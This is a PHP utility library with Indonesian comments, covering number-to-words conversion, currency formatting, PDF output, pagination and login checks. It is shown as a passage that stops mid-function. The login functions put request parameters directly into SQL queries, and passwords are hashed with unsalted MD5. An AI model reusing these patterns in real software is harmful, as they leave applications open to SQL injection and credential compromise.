<?php
/*

/[a-zA-Z0-9,]+/ matches if any of the characters are alphanumeric + comma.
/^[a-zA-Z0-9,]+$/ matches if all of the characters are alphanumeric + comma.

    / : regex delimiters.
    ^ : start anchor
    [..] : Char class
    0-9 : any digit
    a-z : any alphabet
    , : a comma. comma is not a regex metachar, so you need not escape it
    + : quantifier for one or more. If an empty input is considered valid, change + to *
    $ : end anchor
    i : to make the matching case insensitive.

	$pattern = '#<table(?:.*?)>(.*?)</table>#';
*/

//buatFolder('a/b/file.php',false); atau 
//buatFolder('a/b');
//public var
$aHari=explode(",","Minggu,Senin,Selasa,Rabu,Kamis,Jum'at,Sabtu");
$aBulan=explode(",","Januari,Februari,Maret,April,Mei,Juni,Juli,Agustus,September,Oktober,November,Desember");
$aBulan2=explode(",","Jan,Feb,Mar,Apr,Mei,Jun,Jul,Agt,Sept,Okt,Nov,Des");
$aIsiCbBulan="Januari;1,Februari;2,Maret;3,April;4,Mei;5,Juni;6,Juli;7,Agustus;8,September;9,Oktober;10,November;11,Desember;12";

function createFolder($path,$inclLastFolder=true){
	return buatFolder($path,$inclLastFolder);
}

/*
chmod("test.txt",0740);
0600 : Read and write for owner, nothing for everybody else
0644 : Read and write for owner, read for everybody else
0755 Everything for owner, read and execute for everybody else
0740 Everything for owner, read for owner's group
*/

function buatFolder($path,$inclLastFolder=true){
	global $toroot,$isTest;
	
	//$cpath=getcwd()."/".$toroot;
	$cpath=getcwd()."/";
	
	//$cpath="";
	//echo "path : $cpath<br>";
	$aDir=explode("/",$path);
	$pth="";
	$j=count($aDir);
	if (!$inclLastFolder)$j--;
	for ($x=0;$x<$j;$x++) {
		$pth=$pth."/".$aDir[$x];
		if ($aDir[$x]!='') {
			$fdTarget=str_replace('//',"/",$cpath.$pth);
			//if ($isTest) echo "<br>cekking target $fdTarget";
			if (!is_dir($fdTarget)) {
				mkdir($fdTarget);
				 if ($isTest) echo (is_dir($fdTarget)?"success":"cannot create.");
				 
				//mkdir($fdTarget,"0755",true);
				//chmod($fdTarget,0755);
				//echo "<br>$fdTarget Created....<br>";
				//$cpath=$fdTarget;
			}  
			//else echo " ... ok";
		} else {
			//if ($isTest) echo "...ok";
			
		}
	}//for
	
	return ;
}

function validasiHP($no,$removeInvalid=false){
	$no=str_replace("-","",$no);
	$no=str_replace(" ","",$no);
	if (substr($no,0,2)=="62") $no="+".$no;
	if ($removeInvalid) {
		if (strlen($no)<7) $no="";
		
	}
	return $no;
}

function showTranslateButton($j=0){
return '
	<div id="translate-this"><a style="width:180px;height:18px;display:block;" class="translate-this-button" href="http://www.translatecompany.com/">translate</a></div>
	<script type="text/javascript" src="http://x.translateth.is/translate-this.js"></script>
	<script type="text/javascript">
	TranslateThis();
	</script>
	';
}

//koma:1000 berarti dibulatkan
function hitungSkala($aW=array(),$maxUkuran=100,$koma=1000){
	$posasteric=1000;
	$j=0;
	$i=0;
	foreach($aW as $w) {
		if ($w==='*') $posasteric=$i;
		$j+=$w*1;
		$i++;
	}
	$i=0;
	if ($j==0) 
		$j=1;
	else {
		//jika w ada yang *
		if ($posasteric!=1000) {
			$sisa=$maxUkuran-$j;
			$aW[$posasteric]=$sisa;
			$j=$maxUkuran;
		}
			
	}
	

	//echo "	skala=$maxUkuran/$j; >>";
	$skala=$maxUkuran/$j;
	$jum=0;
	$i=0;
	foreach($aW as $w) {
		if ($koma==1000)
			$b= round($aW[$i]*$skala,4) ;
		else	
			$b=round($aW[$i]*$skala,0);
		$jum+=$b;
		$aW[$i]=($jum<=$maxUkuran?$b:$b-($jum-$maxUkuran));
		
		$i++;
	}
	//echo showta($aW);
	return $aW;	
}

function buatPDF($htmlPDF="ISI",$nmFilePDF='coba.pdf', $tipeOutput='F'){
	global $useJS;
	global $lib_path;
	
	$useJS=2;
	require_once("conf.php");
	require_once($lib_path.'tcpdf/tcpdf_include.php');
	//if ($nmFilePDF=='') $nmFilePDF='coba.pdf';
	$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);
	$pdf->setPrintHeader(false);
	$pdf->setPrintFooter(false);
	
	$pdf->SetCreator(PDF_CREATOR);
	$pdf->SetAuthor("um412@yahoo.com");
	$pdf->SetTitle($nmFilePDF);
	//$pdf->SetSubject('TCPDF Tutorial');
	//$pdf->SetKeywords('TCPDF, PDF, example, test, guide');
	$pdf->SetMargins(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);
	$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);
	$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);
	
	if (@file_exists(dirname(__FILE__).'/lang/eng.php')) {
		require_once(dirname(__FILE__).'/lang/eng.php');
		$pdf->setLanguageArray($l);
	}
	
	$pdf->AddPage(); 
	//$pdf->SetFont('helvetica', '', 12);
	
	$pdf->writeHTML($htmlPDF, true, false, true, false, '');
	$pdf->Output($nmFilePDF,  $tipeOutput);
}


function getConfig($nmfield ){
	global $gKdEvent;	 
	if (isset($gKdEvent)) 
		$syConfig=" where kdevent='$gKdEvent'";
	else
		$syConfig=" where 1";//id='1'	
	$sq="select $nmfield from tbconfig $syConfig";
	return cariField($sq);
}

function saveConfig($nmfield,$val){
	global $gKdEvent;	 
	if (isset($gKdEvent)) 
		$syConfig=" where kdevent='$gKdEvent'";
	else
		$syConfig=" where 1";//id='1'
	field_exists("tbconfig",$nmfield,"varchar(100)"); 
	mysql_query2("update tbconfig set $nmfield='$val' $syConfig");
	//return cariField("select $nmfield from tbconfig $syConfig");
}

 
function terbilang($number) {
	if (substr($number,-2)==".00") $number=substr($number,0,-2); 
	$number=round(unmaskRp($number));
	return spellNumberInIndonesian($number);
}
function spellNumberInIndonesian($number) {
	$result = "";
	
	$number = strval($number);
	if (!preg_match("/^[0-9]{1,15}$/", $number)) return false;

	$ones           = array("", "satu", "dua", "tiga", "empat", "lima", "enam", "tujuh", "delapan", "sembilan");
	$majorUnits     = array("", "ribu", "juta", "milyar", "trilyun");
	$minorUnits     = array("", "puluh", "ratus");
	$length         = strlen($number);
	$isAnyMajorUnit = false;
	
	for ($i = 0, $pos = $length - 1; $i < $length; $i++, $pos--) {
		if ($number{$i} != '0') {
			if ($number{$i} != '1') {
				$result .= $ones[$number{$i}].' '.$minorUnits[$pos % 3].' ';
			} else if ($pos % 3 == 1 && $number{$i + 1} != '0') {
				if ($number{$i + 1} == '1')
					$result .= "sebelas ";
				else
					$result .= $ones[$number{$i + 1}]." belas ";
				$i++; $pos--;
			} else if ($pos % 3 != 0) {
				$result .= "se".$minorUnits[$pos % 3].' ';
			} else if ($pos == 3 && !$isAnyMajorUnit) {
				$result .= "se";
			} else {
				$result .= "satu ";
			}
			$isAnyMajorUnit = true;
		}

		if ($pos % 3 == 0 && $isAnyMajorUnit) {
			$result         .= $majorUnits[$pos / 3].' ';
			$isAnyMajorUnit = false;
		}
	}
	$result = trim($result);
	if ($result == "") $result = "nol";

	return $result;
}


function terbilangEn($n){
  if ($n < 0) return 'minus ' . terbilangEn($n);
  else if ($n < 10) {
    switch ($n) {
      case 0: return 'zero';
      case 1: return 'one';
      case 2: return 'two';
      case 3: return 'three';
      case 4: return 'four';
      case 5: return 'five';
      case 6: return 'six';
      case 7: return 'seven';
      case 8: return 'eight';
      case 9: return 'nine';
    }
  }
  else if ($n < 100) {
    $kepala = floor($n/10);
    $sisa = $n % 10;
    if ($kepala == 1) {
      if ($sisa == 0) return 'ten';
      else if ($sisa == 1) return 'eleven';
      else if ($sisa == 2) return 'twelve';
      else if ($sisa == 3) return 'thirteen';
      else if ($sisa == 5) return 'fifteen';
      else if ($sisa == 8) return 'eighteen';
      else return terbilangEn($sisa) . 'teen';
    }
    else if ($kepala == 2) $hasil = 'twenty';
    else if ($kepala == 3) $hasil = 'thirty';
    else if ($kepala == 5) $hasil = 'fifty';
    else if ($kepala == 8) $hasil = 'eighty';
    else $hasil = terbilangEn($kepala) . 'ty';
  }
  else if ($n < 1000) {
    $kepala = floor($n/100);
    $sisa = $n % 100;
    $hasil = terbilangEn($kepala) . ' hundred';
  }
  else if ($n < 1000000) {
    $kepala = floor($n/1000);
    $sisa = $n % 1000;
    $hasil = terbilangEn($kepala) . ' thousand';
  }
  else if ($n < 1000000000) {
    $kepala = floor($n/1000000);
    $sisa = $n % 1000000;
    $hasil = terbilangEn($kepala) . ' million';
  }
  else return false;

  if ($sisa > 0) $hasil .= ' ' . terbilangEn($sisa);
  return $hasil;
}
/*
if ($row_ar1['sum(ar.mdoc)']){
	echo (ucwords(terbilangEn($row_ar1['sum(ar.mdoc)'])));
}
*/

	//0:case sensitive,1:lowercase,2:uppercase,3:numberonly,4:alphaonly+upper
function generateAccessKey($tb='registrasi',$awalan="",$nmfield='access_key',$case=0,$digit=2){
	 $actemp="";
	 for ($i=1;$i<=$digit;$i++) {
		$actemp.=chr(rand(97,122));
		if ($case!=4) $actemp.=rand(0,9);
		$actemp.=chr(rand(65,90));
		
	 }
	 if (($case==2)||($case==4)) $actemp=strtoupper($actemp);
	 $actemp=substr($actemp,0,$digit);
	 
	 $access_key=$awalan.$actemp;
	 $s="select $nmfield  from `$tb` where $nmfield ='$access_key'";
	 $hasil= @mysql_query2($s);
	 if (!$hasil) echo "error $s";
	 $r=@mysql_fetch_array($hasil);
	 if(!empty($r)) 
	 	return generateAccessKey($tb,$awalan,$nmfield,$case,$digit);
	 else
	 	return  $access_key;
}

/*option: CO:capitalOnly,SC:SpecialChar,*/
function randomString($STRlen,$option="") {
	$chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZ";
	if (strstr($option,"CO")=="") $chars.="abcdefghiklmnopqrstuvwxyz";
	if (strstr($option,"SC")!="") $chars.="#$%&@";
	$string_length = $STRlen;
	$randomstring = '';
	for ($i=0;$i<$string_length;$i++) {
		$rnum =rand(1, strlen($chars));
		$randomstring .= substr($chars,$rnum,1);
	}
	return substr($randomstring,0,$STRlen);
}
function genUID($tb='tbppembantu',$nmfield='vuserid',$digit=8) {
	return generateAccessKey($tb,$awalan="",$nmfield,$case=1,$digit);
}



function rupiah2($angka,$useRp=1,$sbminus="()"){
	global $useDecimal,$media;
	$a=abs($angka);
	$frp= ($useRp?"Rp. ":"").maskRp($angka).($useDecimal==0?",-":"");
	
	if ($angka<0) {
		if ($sbminus=="-")
			$frp="-".$frp;
		else
			$frp="($frp)";
		
	}
	return $frp;
}

function rupiah($angka,$mtuang=""){
	$angka*=1;
	global $lastmatauang,$matauang,$useUSD,$useDecimal,$media;
	if (!isset($useUSD))$useUSD=false;
	//echo "mata uang $mtuang angka $angka ";
	$frp= "Rp. ".maskRp($angka);
	//$fusd= "USD ".maskRp($angka,2);
	
	$nfo1=number_format($angka,2,",",".");
	if (substr($nfo1,-3)==',00') $nfo1=maskRp($angka,0);
	$fusd= "USD ".$nfo1;
	
	if ($mtuang=='') {
		if (isset($matauang)) {
			$mtuang=$matauang;
		} else {		
			if ($angka==0) {
				$mtuang=$lastmatauang;
			}elseif ($useUSD)
				$mtuang="USD";
			else
				$mtuang="Rp";
		}
	}
	
	if ($media!='xls') {
		$hasil=(strtoupper($mtuang)=="USD"?$fusd:($mtuang=='-'?maskRp($angka):$frp));
		if (strtoupper($mtuang)!="USD") $hasil.=($useDecimal==0?",-":"");
	} else 
		$hasil=$angka;
	
	$lastmatauang=$mtuang;	
	return $hasil;
}	

function currency($angka, $batas=4000){
	if ($angka==0)
	return  $angka;
	elseif ($angka>$batas)
	return  "Rp. ".number_format($angka,0).",-";
	else
	return  "USD ".number_format($angka,0)."";
}	

function sendMail($to="um412@yahoo.com",$subject = "komentar tcsoft",$body = "tcsoft"){
 $headers="From: um412@yahoo.com";
 return @mail($to, $subject, $body,$headers);
}

function redirection($wb="",$to=1,$tempat=""){
	//echo $wb;exit;
	if ($tempat=="") {
		if ($wb=="")
			echo "<script>setTimeout('location.href=\"$folderHost\"',$to);</script>";
		else 
			echo "<script>setTimeout('location.href=\"$wb\"',$to);</script>";
	}
	else {
		if ($tempat=='-') $tempat='maincontent';
		echo "<script>bukaAjax('$tempat','$wb');</script>";	
	}
}

function setHeader($tp="",$incl=0){
	/*
	global showHeader;
	if ($showHeader!="") 
		$tp=strip_tags(str_replace("<br>", " ", $tp),"");
 	$titlepage=$tp;
  	if ($_REQUEST["showHeader"]=="") 
		$incl=1;
		else
		$incl=$_REQUEST["showHeader"];
 	if (isset($showHeader)) $incl=$showHeader;	 	
    if ($incl==1)	include_once $toroot."head1.php";
	*/
}

function setFooter($showFooter=0){
	if (($showHeader==1) ||($showFooter==1)) {
		include_once "foot1.php";
 	}
}

//format d:ddmmyy
function cariField($sqlku,$format='') {	
	global $hasilCari;
	$hasil=mysql_query2($sqlku);
    $hasil1='';
	if ($hasil) {
		$bar=$hasilCari=mysql_fetch_array($hasil);
		
		
		if ($bar) {
			//geser hasilCari
			$i=0;
			foreach($bar as $h) {
				if (isset($bar[$i]))
					$hasilCari[$i+1]=$bar[$i];
				else
					$hasilCari[$i+1]='';
					
				$i++;
			}
			$hasil1=$bar[0];
			if ($format!='') {
				$tp=substr($format,0,1);
				$fm=substr($format,-2);
				if ($tp=='d') {
					$hasil1=sqltodate($hasil1,$fm);
				}
			}
		} //else echo "Error : $sqlku";
	}
	return $hasil1;
}

//mencari semua isi field 
function cariSField($sqlku,$ssy="",$fld="",$param="|") {
	if (strlen(trim($ssy))<=0)   return "";
	//$ssy = ao1|ao2 fld=kode,buku
	 
	if (strstr($ssy,"|")!='') {
		$sy="";
		$asy=explode("|",$ssy);
		foreach ($asy as $xsy) {
			if ($xsy!='') {
				$sy.=($sy==""?"":" or ").$fld."='$xsy'";
			}
		}
		$sy=" where ($sy)";
	} else $sy=" where $fld='$ssy' ";
	
	$sql=$sqlku." ".$sy;
	$hasil=mysql_query2($sql);
    $hasil1='';
	while ($bar=mysql_fetch_array($hasil)){
		$hasil1.=($hasil1==""?"":$param).$bar[0];
	} //else echo "Error : $sqlku";
	return $hasil1;
}

 
//function um412_falr($txt,$jalert="danger",$bentuk=1, $addstyle="margin:20px;text-align:center"){
function um412_falr($txt,$jalert="danger",$bentuk=1,$iconAndAddCSS=""){
	$ai=explode("|",$iconAndAddCSS."||");
	$judulIcon=$ai[0];
	$addstyle=($ai[1]==""?"display:block;":$ai[1]);
		
	$t="";
	$jenis=($bentuk==1?"alert":($bentuk==2?"callout":($bentuk==3?"text":"alert2")));
	$t.="<div class='$jenis $jenis-$jalert $jenis-dismissible ' style='$addstyle'>";
	if ($judulIcon!='') {
		$icn=($jalert=="danger"?"fa fa-ban":
		($jalert=="info"?"fa fa-info":
		($jalert=="warning"?"fa fa-warning":
		($jalert=="success"?"fa fa-check":"fa fa-ban"))));
		if ($judulIcon!==1)
			$txtj=$judulIcon;
		else {
			$txtj=($jalert=="danger"?"Informasi":
			($jalert=="info"?"Informasi":
			($jalert=="warning"?"Perhatian":
			($jalert=="success"?"Informasi":"Informasi"))));
		}
		$t.="<h4><i class='icon $icn'></i>$txtj</h4>";
	}
	
	$t.=$txt;
	$t.="</div>";
	return $t;
	//echo "<center><font color=red><blink>".$st."</blink></font></center>";
}


function um412_down($nmfile,$fld,$jenis){
	global $isAdmin;
	if ($nmfile!="") {
	 include_once('lib/mb_cek.php');
	 $username=$_SESSION["s_mbid"];
	 if ($jenis==1) 
				$j="<img src='img/icon/down.png' border=0 width=16>";
			 else if ($jenis==2) 
				$j="$nmfile";
			 else
				$j="<span class=button1> Download  </span>";
			
			
	if (!$isAdmin) 
		return "<a href='index.php?mod=mb_login'>$j</a>";
	else {
		 if ($nmfile=="test")
			return '';
			else return "<a href='$fld/$nmfile'>$j</a>";
		}
	}
	else
		return "";
}

function buatlinkPage2($sqlku,$pg,$jpperpage,$jperpage,$varlim,$lim) {
return buatlinkPage3("",$sqlku,$pg,$jpperpage,$jperpage,$varlim,$lim); 
}

function buatlinkPage3($tajax='maincontent',$sql_or_jrecord,$pg,$jpperpage,$jperpage,$varlim,$lim) {
	$addClass="class='btn btn-mini btn-sm btn-primary'";
	$addClass2="class='btn btn-mini btn-sm btn-danger'";
	$ln=strlen($pg);
	$curpage=1;
	if (stristr($pg,"?"))  $pg=$pg."&";
	if (substr($pg,$ln-3,3)=="php") $pg=$pg."?";
	
	if (strstr($sql_or_jrecord,'select')!='') {
		$hasil=mysql_query2($sql_or_jrecord);
		if (!$hasil) echo "err:$sqlku";		
		$jrecord=mysql_num_rows($hasil);
	}
	else $jrecord=$sql_or_jrecord*1;
	
	
	$psekarang=$lim/$jperpage;
	$jrpp=($jpperpage*$jperpage);
	
	if ($jrecord>0) {
		$maxp=ceil($jrecord/$jperpage);
		$sisa=$jrecord-$maxp*$jperpage;
		if ($maxp>1) { //jika lebih dari 1 halaman
			//$pawal=($psekarang+1)-round(($jpperpage-1)/2);
			$pawal=floor($lim/$jrpp)*$jpperpage+1;
			//echo "lim $lim pa $pawal jrpp $jrpp";
			if ($pawal<=0) $pawal=1; //jika minus
			$pakhir=min($pawal+$jpperpage-1,$maxp);
			
			

			$tblinkawal="";
			$btpageawal=($pawal-1)*$jperpage;//batas record pd halaman awal yang tampil di range
		
			$btpageakhir=($pakhir+1)*$jperpage;//batas record pada halaman	akhir yang	tampil di range	 		
			if ($pawal-1>0) {
				//memberikan link ke halaman 1
				$bt=($pawal-$jpperpage-1)*$jperpage;
				if ($bt<0) $bt=0;
				//echo "bt $bt";
				if ($bt>0) {
					$lnk=$pg."$varlim=0";
					if ($tajax!="") $lnk="bukaAjax('$tajax','$lnk');return false;";
					$tblinkawal.= "<a $addClass onclick=\"$lnk\" ><i class='angle-left'> <<< </i></a>";
				}
				
				$lnk=$pg."$varlim=$bt";//ke halaman 1
				if ($tajax!="") $lnk="bukaAjax('$tajax','$lnk');return false;";
				$tblinkawal.= " <a $addClass onclick=\"$lnk\" ><i class='angle-double-left'> << </i></a> ";
			}
			
		
	
			//mengetahui halaman terakhir dan memberikan link ke halaman berikutnya 
			$tblinkakhir="";
			
			//if ($lm<$jrecord) {
			if ($pakhir<$maxp) {
				$lm=(($pakhir)*$jperpage);

				$lnk=$pg."$varlim=$lm";
				if ($tajax!="") $lnk="bukaAjax('$tajax','$lnk');return false;";
				$tblinkakhir.= "<a $addClass onclick=\"$lnk\" >&gt;&gt;</a> ";
				
				$lm=($maxp-1)*$jperpage;
				if ($pakhir+$jpperpage<$maxp) {
					$lnk=$pg."$varlim=$lm";	
					if ($tajax!="") $lnk="bukaAjax('$tajax','$lnk');return false;";
					$tblinkakhir.= " <a $addClass onclick=\"$lnk\" >&gt;&gt;&gt; </a>";
				}
			}
 
			//link halaman sebelumnya
			$linkpage="";
			$prevpage=$nextpage="";
			for ($p=$pawal;$p<=$pakhir;$p++) {
				$bt=($p-1)*$jperpage;
				$ttl="Menuju ke halaman ";
				if ($bt==$lim) {//halaman aktif
					$linkpage=$linkpage."<span $addClass2 > $p </span> ";
					$curpage=$p;
					
				} else {
					$lnk=$pg."$varlim=".$bt;
					$linkpage=$linkpage." <a $addClass onclick=\"bukaAjax('$tajax','$lnk')\" title='$ttl $p'> $p</a> ";
				}//if	
			}//for
		}
		if ($maxp>1) {
			$lp="<span class=tlinkpage>
			<span class='btn-group' >
				<span $addClass2 > Page $curpage</span>";
				$lp.=$tblinkawal.$prevpage.$linkpage.$nextpage.$tblinkakhir;
				$lp.="
				</span>
			</span>";
		} else 	$lp="";

		return $lp;
	}
}

//cek apakah user atau bukan..... return true/false
function kill_nologin($s_name='idreg',$s_value=""){
	global $isAdmin;
	$ok=false;
	if ($isAdmin) 
		$ok=true;
	else if ($s_value=='') {
		$ok=($_SESSION[$s_name]!=''); 
	} else
		$ok=($_SESSION[$s_name]==$s_value); 
		//echo "".$_SESSION[$s_name]."->".$s_value;
	if (!$ok) { tampilDialog("ops....please login before..."); die(); }
}
function kill_unauthorized_user(){
	global $js_path;
	global $toroot;
	global $um_path;
	global $isAdmin;
	global $userType;
	global $userID;
	
	$opr="";
	if ($userID=='Guest') {
		$nfAction=$toroot."adm/index.php?rep=usr";
		$idForm="usr_".(rand(2345,322333));
		$t="<div id='ts"."$idForm' ></div>";
		$aform="method='post' enctype='multipart/form-data'  name='$idForm' id='$idForm' 
				onsubmit=\"ajaxSubmitAllForm('$idForm','ts"."$idForm','user');return false;\" ";
		$t.="  <form action='$nfAction' $aform  >";
		$t.="
		 <div style='background:url(img/bglogin.jpg);margin-top:-7px'><br />
		<br />
		<br />
		<br />
		<br />
		<br />

		 <center><div class=dialog1 id=dialoglogin   > 
		 <div class=titledialog1>USER LOGIN</div> 
		 <div class=tooltips>&nbsp; </div>
		<table width=250 align=center cellpadding=0 cellspacing=0 border=0>
			<tr class='troddform2'> <td style='width:75px' >User ID </td> <td  >:</td><td> <input name=usrid type=text id=usrid size=20 /></td></tr>
			<tr class='troddform2'> <td  > Password </td><td  >:</td><td><input name=usrps type=password id=usrps size=20 /></td></tr>
			<tr><td colspan=3  align=center><br><center> 
			<input name=HOME type=button  value=HOME class=button onclick=\"location.href='$toroot"."index.php';\"/>
			<input name=submit type=submit  value=LOGIN class=button /></center></td></tr>
			<tr><td  align=center  colspan=3>&nbsp;</td></tr>
		</table>
		<input type=hidden  name=op value=login >
		 </DIV>
		 </center>
		 </form>		
		<br />
		<br />
		<br />
		<br />
		<br />
		<br />

		 </div><br />

		 
		";
		$redir=$_SERVER['PHP_SELF']."?".$_SERVER['QUERY_STRING'];
		$_SESSION['redirection']=$redir;
		//echo $redir;
		echo $t;
		exit;
	}
	else return true;
}

function ku(){ return kill_unauthorized_user();}

//cek apakah user sudah login atau belum, jika belum, maka dianggap Guest;
function user_cek($uid="",$ups="",$nmTbUser="tbuser"){
	global $userID;
	global $userid;
	global $userType;
	global $userName;
	global $toroot;
	global $viewAs;
	global $isAdmin;
	global $isGuest;
	global $adm_path;

	global $jlogin;
	global $usrid;
	global $usrps;
	global $usrnm;
	global $usrtype;
	global $pes;
	global $dbku;
	global $koneksi;
	global $toroot;
	global $dbku,$koneksidb;

	if (!isset($_SESSION["usrps"])) $_SESSION["usrps"]='Guest';
	if (!isset($_SESSION["usrid"])) $_SESSION["usrid"]='Guest';
	if (!isset($_SESSION["usrnm"])) $_SESSION["usrnm"]='Guest';
	if (!isset($_SESSION["usrtype"])) $_SESSION["usrtype"]='Guest';
	if (!isset($_SESSION["jlogin"])) $_SESSION["jlogin"]='USER';
	$nfusr=$adm_path."usr-cek-local.php";	
	if (file_exists($nfusr) ) {
		include_once $nfusr;
	} else {
		//echo "$nfusr nggak ketemu.....";
		if ($uid=="") {//cek logi
			if (isset($_REQUEST["usrid"])) {
				$uid=$userid=$userID=$_REQUEST["usrid"];
				$usrpsx=md5($_REQUEST["usrps"]); 
			} else {	
				$uid=$userid=$userID=$_SESSION["usrid"];
				$usrpsx=$_SESSION["usrps"]; 
			}
		}  else	$usrpsx=md5($ups);
		
		$aui=($uid=='sa'?" or userid='admin'":"");
		$sqlusr="select * from $nmTbUser where (userid='$uid' $aui)  and pass='$usrpsx' ";
		//echo $sqlusr;
		$hasilusr=@mysql_query($sqlusr);
		if (mysql_num_rows($hasilusr)>0) { 
			$rwusr=mysql_fetch_array($hasilusr);
			$userID=$userid	=$_SESSION["usrid"]=$uid;//$rwusr["userid"];
			$userName		=$_SESSION["usrnm"]=$rwusr["username"];
			$userps			=$_SESSION["usrps"]=$rwusr["pass"] ;
		//	$userType		=$_SESSION["usrtype"]=$rwusr["usertipe"] ;
			$userType		=$_SESSION["usrtype"]=$rwusr["usertype"] ;
		} else {
			$userID=$userid=$_SESSION["usrid"]="Guest";
			$userName=$_SESSION["usrnm"]="Guest";
			$userType=$_SESSION["usrtype"]="Guest";
		} 
	}
	$isAdmin=($userID!='Guest'?true:false);
	$isGuest=($userID=='Guest'?true:false);
	return $userid;
}

function user_cek_old($uid="",$ups="",$nmTbUser="tbuser"){
	global $userID;
	global $userid;
	global $userType;
	global $userName;
	global $toroot;
	global $viewAs;
	global $isAdmin;
	global $isGuest;
	global $adm_path;

	global $jlogin;
	global $usrid;
	global $usrps;
	global $usrnm;
	global $usrtype;
	global $pes;
	global $dbku;
	global $koneksi;
	global $toroot;

	if (!isset($_SESSION["usrps"])) $_SESSION["usrps"]='Guest';
	if (!isset($_SESSION["usrid"])) $_SESSION["usrid"]='Guest';
	if (!isset($_SESSION["usrnm"])) $_SESSION["usrnm"]='Guest';
	if (!isset($_SESSION["usrtype"])) $_SESSION["usrtype"]='Guest';
	if (!isset($_SESSION["jlogin"])) $_SESSION["jlogin"]='USER';
	$nfusr=$adm_path."usr-cek-local.php";	
	if (file_exists($nfusr) ) {
		include_once $nfusr;
	} else {
		//echo "$nfusr nggak ketemu.....";
		if ($uid=="") {//cek logi
			if (isset($_REQUEST["usrid"])) {
				$uid=$userid=$userID=$_REQUEST["usrid"];
				$usrpsx=md5($_REQUEST["usrps"]); 
			} else {	
				$uid=$userid=$userID=$_SESSION["usrid"];
				$usrpsx=$_SESSION["usrps"]; 
			}
		}  else	$usrpsx=md5($ups);
		
		$aui=($uid=='sa'?" or userid='admin'":"");
		$sqlusr="select * from $nmTbUser where (userid='$uid' $aui)  and pass='$usrpsx' ";
		//echo $sqlusr;
		$hasilusr=@mysql_query($sqlusr);
		if (mysql_num_rows($hasilusr)>0) { 
			$rwusr=mysql_fetch_array($hasilusr);
			$userID=$userid	=$_SESSION["usrid"]=$uid;//$rwusr["userid"];
			$userName		=$_SESSION["usrnm"]=$rwusr["username"];
			$userps			=$_SESSION["usrps"]=$rwusr["pass"] ;
		//	$userType		=$_SESSION["usrtype"]=$rwusr["usertipe"] ;
			$userType		=$_SESSION["usrtype"]=$rwusr["usertype"] ;
		} else {
			$userID=$userid=$_SESSION["usrid"]="Guest";
			$userName=$_SESSION["usrnm"]="Guest";
			$userType=$_SESSION["usrtype"]="Guest";
		} 
	}
	$isAdmin=($userID!='Guest'?true:false);
	$isGuest=($userID=='Guest'?true:false);
	return $userid;
}

//digunakan untuk menampilkan tb operasi jika username=sama
function tboperasi($pg,$idrecord,$idname='id',$usrtp1='admin',$sTargetWin='maincontent',$atombol='111', $showresult=1){	
	global $img_path;
	global $addTbOperasi;
	global $usr_nm;//config
	global $userType;
	$targetWin=explode(",",$sTargetWin.",".$sTargetWin);
	 
	if ($usr_nm=='Guest')
		return " ";
	else {		
		$sty=" style='width:15px;border:0px;padding:0px;'";
		$ck=true;
		$pth=$t='';
		if ($targetWin=='')$targetWin='maincontent';
		$fa1 ="href=# onclick=\"bukaAjaxD('$targetWin[0]'  ,'$pg-inp.php?pengenal=$targetWin[0]','width:wMax-30');return false;\" ";
		$fa2 ="href=# onclick=\"bukaAjaxD('$targetWin[0]'  ,'$pg-inp.php?pengenal=$targetWin[0]&$idname=".urlencode($idrecord)."','width:wMax-30');return  false; \" ";
		$fa3 ="href=# onclick=\"if (confirm('Yakin Akan menghapus data ini?')) {bukaAjax('m_".$targetWin[1]."','$pg-daf.php?$addTbOperasi&op=hp&$idname=".urlencode($idrecord)."',0); } return false;\" ";
		$ck=(substr_count("$usrtp1,superadmin,all,sa,",$userType)>0);
		//echo "$userType,superadmin,all,sa,admin, >$usrtp1";
		if ($ck){
			if ($atombol[0]=='1') $t.="<a class=tbadd  $fa1 title='Tambah Data'>&nbsp;</a>";
			if ($atombol[1]=='1') $t.="<a class=tbedit $fa2 title='Edit Data'>&nbsp;</a>";
			if ($atombol[2]=='1') 
			$t.="<a class=tbdel  $fa3 title='Hapus Data' >&nbsp;</a>";
			$t="<span class=tboprxx >$t</span>";    
				return $t;
			}
		else
			return "&nbsp;";
	}
}

function tboperasi2($pg,$idrecord,$idname='id',$susertype='admin',$sTargetWin='maincontent',$atombol='111', $showresult=1){	
	global $img_path;
	global $addTbOperasi;
	global $usr_nm;//config
	global $userType;
	global $userID;
	$targetWin=explode(",",$sTargetWin.",".$sTargetWin);
	 
	if ($usr_nm=='Guest')
		return " ";
	else {		
		$sty=" style='width:15px;border:0px;padding:0px;'";
		$ck=true;
		$pth=$t='';
		if ($targetWin=='')$targetWin='maincontent';
		$fa1 ="href=# onclick=\"bukaAjaxD('$targetWin[0]'  ,'index.php?rep=$pg-inp&pengenal=$targetWin[0]&contentOnly=1&useJS=2','width:wMax-30');return false;\" ";
		$fa2 ="href=# onclick=\"bukaAjaxD('$targetWin[0]'  ,'index.php?rep=$pg-inp&pengenal=$targetWin[0]&contentOnly=1&useJS=2&$idname=".urlencode($idrecord)."','width:wMax-30');return  false; \" ";
		$fa3 ="href=# onclick=\"if (confirm('Yakin Akan menghapus data ini?')) {bukaAjax('m_".$targetWin[1]."','index.php?rep=$pg-daf&$addTbOperasi&op=hp&contentOnly=1&useJS=2&$idname=".urlencode($idrecord)."',0); } return false;\" ";
		$ck=(substr_count("$susertype","all")>0);
		if (!$ck) {
			$ck=(substr_count(",$susertype,all,sa",$userType)>0);
		}		//echo "$userType 	 >$usrtp1 $ck > ";
		if ($ck||($userID=='sa')){
			if ($atombol[0]=='1') $t.="<a class=tbadd  $fa1 title='Tambah Data'>&nbsp;</a>";
			if ($atombol[1]=='1') $t.="<a class=tbedit $fa2 title='Edit Data'>&nbsp;</a>";
			if ($atombol[2]=='1') {
			//	$t.="<a class=tbdel  $fa3 title='Hapus Data' ><i class='fa fa-trash'></i></a>";
				$t.="<a class=tbdel  $fa3 title='Hapus Data' >&nbsp;</a>";
			}
			$t="<span class=tboprxx >$t</span>";    
				return $t;
			}
		else
			return "&nbsp;";
	}
}



function um412_admopr4($pg,$idrecord,$tp='all',$td='',$idname='id',$cekadmin=1){
	if ($cekadmin==1)
		tboperasi($pg,$idrecord,$idname='id',$usernm='admin');
	else
